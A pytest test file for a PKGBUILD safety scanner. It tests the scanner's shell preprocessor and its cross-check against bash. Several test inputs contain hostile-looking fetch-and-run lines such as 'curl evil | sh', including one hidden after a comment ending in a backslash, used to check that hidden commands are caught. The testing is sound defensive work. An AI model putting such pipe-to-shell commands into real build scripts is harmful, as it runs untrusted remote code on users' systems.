"""The preprocessor: comments out, one command per line, original line numbers, and agreement with bash."""
import random
import shutil

import pytest

from paru_safety_checker import crosscheck
from paru_safety_checker.heuristics import scan
from paru_safety_checker.preprocess import preprocess, render

needs_bash = pytest.mark.skipif(shutil.which("bash") is None, reason="bash is required for the cross-check")


def view(text):
    pre = preprocess(text)
    assert pre.ok, pre.error
    return [(l.number, l.region, l.kind, l.text) for l in pre.lines]


def commands(text):
    return [(l.number, l.text) for l in preprocess(text).lines if l.kind in ("command", "assignment", "array", "control")]


# ---- comments ----

def test_comments_are_removed_everywhere_bash_removes_them():
    text = "# top\npkgname=foo # trailing\nsource=('a' # in array\n  'b') # after\nbuild() { # open\n  make # f\n}\n"
    assert view(text) == [
        (2, "top", "assignment", "pkgname=foo"),
        (3, "top", "array", "source=('a' 'b')"),
        (5, "top", "function", "build()"),
        (6, "function", "command", "make"),
    ]
    assert [c for _, c in preprocess(text).comments] == ["# top", "# trailing", "# in array", "# after", "# open", "# f"]


@pytest.mark.parametrize("text", [
    'echo ${#a} $# ${a#x} ${a##y} "#" \'#\' a#b \\# $((1#1))',
    'echo "# not a comment" \'# nor this\'',
    "cat <<EOF\n# heredoc body\nEOF",
    "x=$(echo a # comment )\n)",
    "echo a;#c\necho b",
    "echo hi \\\n# comment after a continuation",
])
def test_things_that_look_like_comments_but_are_not(text):
    pre = preprocess(text)
    assert pre.ok
    kept = " ".join(l.text for l in pre.lines)
    assert ("# heredoc body" in kept) == ("heredoc body" in text)
    if '"# not a comment"' in text:
        assert '"# not a comment"' in kept and "'# nor this'" in kept
    if "${#a}" in text:
        assert "${#a} $# ${a#x} ${a##y}" in kept


def test_a_comment_hiding_the_end_of_a_substitution_is_handled_like_bash():
    pre = preprocess("x=$(echo a # comment )\n  echo b\n)\n")
    assert [l.text for l in pre.lines] == ["x=$(echo a ; echo b; )"]


# ---- one command per line ----

def test_commands_joined_by_separators_are_split_and_pipelines_stay_together():
    assert commands("cd x; make && make install || true & echo done\ncurl a | sh\n") == [
        (1, "cd x"), (1, "make"), (1, "make install"), (1, "true"), (1, "echo done"), (2, "curl a | sh"),
    ]


def test_commands_spread_over_lines_are_joined():
    assert commands("curl \\\n  -o f \\\n  https://x\nfoo\\\nbar\n") == [(1, "curl -o f https://x"), (4, "foobar")]
    assert commands("echo 'a\nb'\n") == [(1, "echo 'a b'")]
    assert commands("a |\n  b\n") == [(1, "a | b")]


def test_command_substitutions_stay_inline_and_multiline_ones_are_separated_by_semicolons():
    assert commands("echo $(curl x | sh) done\n") == [(1, "echo $(curl x | sh) done")]
    assert commands("x=$(\n  a\n  b\n)\n") == [(1, "x=$( a; b; )")]


def test_control_keywords_are_dropped_but_the_commands_they_control_are_kept():
    text = "if curl a | sh; then echo yes; else echo no; fi\nwhile read x; do echo $x; done\nuntil true; do :; done\n! grep x f\n"
    assert [c for _, c in commands(text)] == [
        "curl a | sh", "echo yes", "echo no", "read x", "echo $x", "true", ":", "grep x f",
    ]


def test_for_and_case_headers_and_patterns():
    text = 'for f in a b; do echo $f; done\ncase "$CARCH" in\n  x86_64) export A=1 ;;\n  a|b) true ;;\nesac\n'
    pre = preprocess(text)
    assert [(l.kind, l.text) for l in pre.lines] == [
        ("control", "for f in a b"), ("command", "echo $f"),
        ("control", 'case "$CARCH" in'), ("case-pattern", "x86_64"), ("command", "export A=1"),
        ("case-pattern", "a|b"), ("command", "true"),
    ]


def test_arrays_become_one_line_whatever_their_layout():
    text = "depends=(\n  bash   # shell\n  'python>=3'\n  \"perl\"\n)\nsource+=('x')\n"
    assert view(text) == [
        (1, "top", "array", "depends=( bash 'python>=3' \"perl\" )"),
        (6, "top", "array", "source+=('x')"),
    ]


# ---- regions ----

def test_functions_define_the_region_and_numbers_are_the_original_lines():
    text = "pkgname=x\nbuild() {\n  make\n}\nf()\n{\n  a; b\n}\nfunction g { c; }\nd=1\n"
    assert [(n, r, t) for n, r, k, t in view(text)] == [
        (1, "top", "pkgname=x"), (2, "top", "build()"), (3, "function", "make"), (5, "top", "f()"),
        (7, "function", "a"), (7, "function", "b"), (9, "top", "g()"), (9, "function", "c"), (10, "top", "d=1"),
    ]


def test_groups_subshells_and_one_line_functions():
    text = "( cd a && make )\n{ x; y; }\nh() { z; }\nafter\n"
    assert [(r, t) for _, r, _, t in view(text)] == [
        ("top", "cd a"), ("top", "make"), ("top", "x"), ("top", "y"), ("top", "h()"), ("function", "z"), ("top", "after"),
    ]


def test_a_function_defined_as_a_subshell():
    assert [(r, t) for _, r, _, t in view("f() ( a; b )\nc\n")] == [("top", "f()"), ("function", "a"), ("function", "b"), ("top", "c")]


# ---- here-documents ----

def test_heredoc_bodies_are_data_lines_and_not_commands():
    text = "cat > f <<'EOF'\n# not a comment\necho $(id)\nEOF\nmake\n"
    pre = preprocess(text)
    assert [(l.kind, l.text, l.expands) for l in pre.lines] == [
        ("command", "cat > f <<'EOF'", False), ("heredoc", "# not a comment", False), ("heredoc", "echo $(id)", False),
        ("heredoc-end", "EOF", False), ("command", "make", False),
    ]


def test_an_unquoted_heredoc_is_marked_as_expanded_and_a_quoted_one_is_not():
    expanded = preprocess("cat <<EOF\n$(id)\nEOF\n")
    quoted = preprocess("cat <<'EOF'\n$(id)\nEOF\ncat <<\\EOF\n$(id)\nEOF\ncat <<\"EOF\"\n$(id)\nEOF\n")
    assert [l.expands for l in expanded.lines if l.kind == "heredoc"] == [True]
    assert [l.expands for l in quoted.lines if l.kind == "heredoc"] == [False, False, False]


def test_heredoc_with_tab_stripping_and_two_on_one_line():
    pre = preprocess("cat <<-A <<B\n\tone\n\tA\ntwo\nB\nafter\n")
    assert [(l.kind, l.text.strip()) for l in pre.lines] == [
        ("command", "cat <<-A <<B"), ("heredoc", "one"), ("heredoc-end", "A"), ("heredoc", "two"), ("heredoc-end", "B"),
        ("command", "after"),
    ]


def test_an_unterminated_heredoc_is_reported_and_swallows_the_rest_like_bash():
    pre = preprocess("cat <<EOF\nbody\ncurl evil | sh\n")
    assert pre.ok and len(pre.notes) == 1 and "never terminated" in pre.notes[0]
    assert [l.kind for l in pre.lines].count("command") == 1
    assert scan({"PKGBUILD": "cat <<EOF\nbody\n"}) and "heredoc-unterminated" in {f.rule for f in scan({"PKGBUILD": "cat <<EOF\nbody\n"})}
    assert [l.kind for l in preprocess("cat <<EOF").lines] == ["command", "heredoc-end"]


# ---- failure behaviour ----

@pytest.mark.parametrize("text", ["echo 'unterminated", 'echo "unterminated', "echo $(unterminated", "echo ${unterminated", "echo `x", "x=$((1+"])
def test_unparseable_shell_falls_back_to_raw_lines_in_the_strictest_region(text):
    pre = preprocess("pkgname=x\n" + text + "\n")
    assert not pre.ok and pre.error
    assert all(l.region == "function" and l.kind == "command" for l in pre.lines)
    assert [l.number for l in pre.lines] == [1, 2]


def test_hostile_nesting_does_not_crash():
    assert not preprocess("echo " + "$(" * 500 + ")" * 500).ok


def test_render_prefixes_every_line_with_its_original_number():
    assert render(preprocess("a=1\n\n# c\nb; c\n")) == "1: a=1\n4: b\n4: c"


# ---- agreement with bash ----

@pytest.fixture
def bash_check(monkeypatch):
    monkeypatch.setattr(crosscheck, "ENABLED", True)


def disagreements(text):
    return [f for f in crosscheck.crosscheck("PKGBUILD", text, preprocess(text))]


TRICKY = [
    "pkgname=foo\nbuild() {\n  make\n}\n",
    "# a\npkgname=foo # b\nsource=('a' # c\n  'b') # d\nbuild() { # e\n  make # f\n}\n",
    'echo ${#a} $# ${a#x} ${a##y} "#" \'#\' a#b \\# $((1#1))\n',
    "cat <<EOF\n# body\n$(id)\nEOF\ncat <<-'X'\n\t# t\n\tX\n",
    "case $a in\n  x) a ;;\n  y|z) b ;;\n  *) c\nesac\n",
    "x=$((1+2)); ((i++)); for ((i=0;i<3;i++)); do :; done\n",
    "[[ $a =~ ^(a|b)$ && -n $b ]] && echo ok || echo no\n[[ a == b ]]<<EOF\nx\nEOF\n",
    "x=$(\n  curl a # note )\n  echo b\n)\n",
    "x=`echo a`\n",
    "echo \"a $(echo 'b \"c\"') d\"\n",
    "curl a \\\n  | sh\nfoo\\\nbar\n",
    "a() { :; }\nfunction b { :; }\nfunction c() { :; }\nd()\n{\n  :\n}\n",
    "( cd x && make ) ; { a; b; }\n",
    "! grep x f; time make\n",
    "a=(1 2)\na+=(3 # c\n 4)\n",
    "diff <(a) <(b)\n",
    "cmd 2>&1 >/dev/null </dev/null &>x &\n",
    "echo hi \\\n# a comment after a continuation\necho next\n",
    "echo a;#c\ncurl evil\n",
    "# a comment ending in a backslash \\\ncurl evil\n",
    "cat <<EOF\nbody\n",
    "cat <<EOF",
]


@needs_bash
@pytest.mark.parametrize("text", TRICKY)
def test_the_scanner_and_bash_agree_on_tricky_scripts(bash_check, text):
    pre = preprocess(text)
    assert pre.ok, pre.error
    assert disagreements(text) == []


REALISTIC = [
    '''# Maintainer: A <a@b.c>
pkgname=python-foo
pkgver=1.2.3
pkgrel=1
url="https://github.com/foo/foo"
depends=('python' 'python-requests')
makedepends=('python-build' 'python-installer')
source=("$pkgname-$pkgver.tar.gz::$url/archive/v$pkgver.tar.gz")
sha256sums=('e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855')
build() {
  cd "foo-$pkgver"
  python -m build --wheel --no-isolation
}
package() {
  cd "foo-$pkgver"
  python -m installer --destdir="$pkgdir" dist/*.whl
  install -Dm644 LICENSE "$pkgdir/usr/share/licenses/$pkgname/LICENSE"
}
''',
    '''pkgname=foo-git
pkgver=r10.abcdef0
provides=("${pkgname%-git}")
conflicts=("${pkgname%-git}")
source=("git+$url.git")
sha256sums=('SKIP')
pkgver() {
  cd "$srcdir/${pkgname%-git}"
  printf "r%s.%s" "$(git rev-list --count HEAD)" "$(git rev-parse --short HEAD)"
}
build() {
  case "$CARCH" in
    x86_64) export CFLAGS+=" -O2" ;;
    aarch64|armv7h) true ;;
  esac
  local _n=$(nproc)
  for f in a b; do echo "$f"; done
  (( _n++ ))
  cmake -S . -B build -G Ninja \\
    -DCMAKE_INSTALL_PREFIX=/usr
}
''',
    '''pkgname=bar-bin
pkgver=$(curl -s https://api.github.com/repos/bar/bar/releases/latest | grep tag_name | cut -d '"' -f4)
source=("$url/releases/download/$pkgver/bar-linux-amd64.tar.gz")
package() {
  install -Dm755 bar "$pkgdir/usr/bin/bar"
  cat > "$pkgdir/usr/bin/wrapper" <<EOF
#!/bin/sh
exec /opt/bar/bar "\\$@"
EOF
  sed -i -e 's|/etc/foo|/usr/share/foo|g' -e '/^#/d' "$pkgdir/etc/x"
  find "$pkgdir" -name '*.a' -delete
}
''',
]


@needs_bash
@pytest.mark.parametrize("text", REALISTIC)
def test_ordinary_pkgbuilds_do_not_trigger_the_cross_check(bash_check, text):
    assert preprocess(text).ok
    assert disagreements(text) == []
    assert not [f for f in scan({"PKGBUILD": text}) if f.rule in ("parser-mismatch", "bash-syntax-error", "unparseable-shell")]


def make_script(rng):
    """A structurally valid script assembled from constructs that appear in real PKGBUILDs."""
    comment = lambda: rng.choice(["", "", " # note", " # it's", ' # say "hi"', " # )", " # $(x)", " # a \\"])
    word = lambda: rng.choice(['"a b"', "'c d'", "$x", "${x#y}", "${#x}", "$(echo hi)", "`id`", '"$(echo \'q\')"', "a#b", "\"#\"", "'#'", "$#", "-f", "/usr/bin"])
    simple = lambda: rng.choice(["make", "echo", "cd", "curl -s", "install -Dm755", "cp", "sed -i", "rm -rf"]) + " " + " ".join(word() for _ in range(rng.randint(0, 3)))
    chain = lambda: rng.choice([" ; ", " && ", " || ", " | "]).join(simple() for _ in range(rng.randint(1, 3)))

    def heredoc():
        delim = rng.choice(["EOF", "'EOF'", '"X"', "-Y"])
        name = delim.strip("-'\"")
        tab = "\t" if delim.startswith("-") else ""
        body = "\n".join(rng.choice(["# body", "text $x", "$(echo a)", "'quote", "#!/bin/sh", ""]) for _ in range(rng.randint(0, 3)))
        return f"cat <<{delim}\n{body}\n{tab}{name}" if body else f"cat <<{delim}\n{tab}{name}"

    def block(depth=0):
        kind = rng.choice(["simple", "simple", "simple", "if", "for", "while", "case", "heredoc", "group", "array", "assign"])
        if kind == "simple":
            return chain() + comment()
        if kind == "heredoc":
            return heredoc()
        if kind == "array":
            return "src=(" + rng.choice(["", "\n  "]) + " ".join(rng.choice(["'a'", '"b"', "c", "$x"]) + rng.choice(["", " # c\n  "]) for _ in range(3)) + ")"
        if kind == "assign":
            return rng.choice(["x=1", 'y="a b"', "z=$(echo a)", "n=$((1+2))", "w=${x:-d}"]) + comment()
        if depth > 1:
            return chain()
        inner = "\n  ".join(block(depth + 1) for _ in range(rng.randint(1, 2)))
        if kind == "if":
            return f"if {chain()}; then{comment()}\n  {inner}\nelse\n  {chain()}\nfi"
        if kind == "for":
            return f"for i in a b; do{comment()}\n  {inner}\ndone"
        if kind == "while":
            return f"while {chain()}; do\n  {inner}\ndone"
        if kind == "case":
            return f"case $x in\n  a) {chain()} ;;{comment()}\n  b|c) {chain()}\n    {inner} ;;\nesac"
        return f"{{ {chain()}; }}"

    pieces = []
    for _ in range(rng.randint(1, 3)):
        body = "\n  ".join(block() for _ in range(rng.randint(1, 4)))
        pieces.append(rng.choice(["f() {", "function g {", "h()\n{"]) + comment() + "\n  " + body + "\n}")
        pieces.append(block())
    return "\n".join(pieces) + "\n"


@needs_bash
def test_generated_valid_scripts_never_disagree_with_bash(bash_check):
    rng = random.Random(20260413)
    checked = 0
    for _ in range(300):
        text = make_script(rng)
        code, _, _ = crosscheck.run_bash(text)
        if code != 0:
            continue                    # the generator is not a bash validator; only valid scripts matter
        checked += 1
        pre = preprocess(text)
        assert pre.ok, (pre.error, text)
        assert disagreements(text) == [], text
    assert checked > 150


# ---- the cross-check itself ----

def ours(text):
    return preprocess(text)


def test_a_dropped_command_is_reported(bash_check):
    pre = preprocess("echo a\ncurl evil | sh\n")
    broken = type(pre)(pre.lines[:1], pre.comments, True)
    found = crosscheck.crosscheck("PKGBUILD", "echo a\ncurl evil | sh\n", broken)
    assert [f.rule for f in found] == ["parser-mismatch"] and "curl" in found[0].message and "dropped" in found[0].message


def test_a_comment_kept_as_code_is_reported(bash_check):
    text = "echo a # secret comment\n"
    pre = preprocess(text)
    wrong = type(pre)(tuple(l._replace(text=l.text + " # secret comment") for l in pre.lines), pre.comments, True)
    found = crosscheck.crosscheck("PKGBUILD", text, wrong)
    assert [f.rule for f in found] == ["parser-mismatch"] and "secret" in found[0].message


def test_bash_syntax_errors_and_a_missing_bash_are_reported_not_ignored(bash_check):
    pre = preprocess("echo hi\n")
    err = crosscheck.crosscheck("PKGBUILD", "x", pre, run=lambda t: (2, "", "bash: line 1: syntax error near unexpected token `)'\n"))
    assert [f.rule for f in err] == ["bash-syntax-error"] and "syntax error" in err[0].message

    def missing(text):
        raise FileNotFoundError("bash")

    gone = crosscheck.crosscheck("PKGBUILD", "x", pre, run=missing)
    assert [f.rule for f in gone] == ["crosscheck-unavailable"] and "bash 4.4" in gone[0].message


def test_the_cross_check_can_be_switched_off_for_tests(monkeypatch):
    monkeypatch.setattr(crosscheck, "ENABLED", False)
    assert crosscheck.crosscheck("PKGBUILD", "x", preprocess("x"), run=lambda t: (_ for _ in ()).throw(AssertionError)) == []


@needs_bash
def test_scan_reports_unparseable_files_and_runs_the_cross_check(bash_check):
    rules = {f.rule for f in scan({"PKGBUILD": "pkgname=x\nbuild() {\n  echo 'oops\n}\n"})}
    assert {"unparseable-shell", "bash-syntax-error"} <= rules
    assert not {"parser-mismatch", "bash-syntax-error", "unparseable-shell"} & {f.rule for f in scan({"PKGBUILD": "pkgname=x\nbuild() {\n  make\n}\n"})}


@needs_bash
def test_bash_is_only_asked_to_parse_never_to_run(bash_check, tmp_path):
    marker = tmp_path / "ran"
    text = f"x=$(touch {marker})\n`touch {marker}`\ncat <<EOF\n$(touch {marker})\nEOF\n"
    crosscheck.run_bash(text)
    assert not marker.exists()
